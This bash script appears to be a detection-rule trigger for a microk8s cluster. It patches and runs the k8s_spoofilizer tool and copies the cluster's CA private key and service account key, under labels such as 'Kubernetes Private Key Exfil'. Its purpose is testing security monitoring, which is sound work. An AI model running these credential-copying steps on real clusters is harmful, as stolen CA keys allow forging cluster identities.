#!/usr/bin/env bash
set -e

kubectl () {
    microk8s kubectl "$@"
}

info () {
    echo -e "\e[34m[INFO]\e[0m $1"
}

success () {
    echo -e "\e[32m[SUCCESS]\e[0m $1"
}

error () {
    echo -e "\e[31m[ERROR]\e[0m $1"
    exit 1
}

# -------------------------------------------------

info "Setting up environment..."


info "installing pre reqs"
git clone https://github.com/jtesta/k8s_spoofilizer.git >/dev/null 2>&1

info "editing source files to work with microk8s..."
sed -i 's|https://kubernetes\.default\.svc\.cluster\.local|https://kubernetes\.default\.svc|g'  ./k8s_spoofilizer/k8s_spoofilizer.py
sed -i 's|, "cluster-admins"|, "system:masters"|' ./k8s_spoofilizer/k8s_spoofilizer.py

sed -i 's|cluster-admins|system-masters|g'  ./k8s_spoofilizer/k8s_spoofilizer.py
sed -i 's|sa\.key|serviceaccount\.key|g'  ./k8s_spoofilizer/k8s_spoofilizer.py
sed -zi 's|get_cluster_internal_dns_url(_output_directory)|DEFAULT_CLUSTER_INTERNAL_URL|'  ./k8s_spoofilizer/k8s_spoofilizer.py

mkdir ./k8s_spoofilizer/key_dir


python3 -m venv ./k8s_spoofilizer/venv
source ./k8s_spoofilizer/venv/bin/activate
pip install -r ./k8s_spoofilizer/requirements.txt >/dev/null 2>&1

# -------------------------------------------------

info "Triggering Rule: Read of Kubernetes CA Key"
cat /var/snap/microk8s/current/certs/ca.key >/dev/null

info "Triggering Rule: Kubernetes Private Key Exfil"
cp /var/snap/microk8s/current/certs/ca.key ./k8s_spoofilizer/key_dir
cp /var/snap/microk8s/current/certs/ca.crt ./k8s_spoofilizer/key_dir
cp /var/snap/microk8s/current/certs/serviceaccount.key ./k8s_spoofilizer/key_dir

info "Triggering Rule: Suspicious ServiceAccount Enumeration"
python3 ./k8s_spoofilizer/k8s_spoofilizer.py --server https://127.0.0.1:16443/ --update-uid-cache ./k8s_spoofilizer/key_dir



# -------------------------------------------------

info "Cleaning up..."
rm -rf ./k8s_spoofilizer/



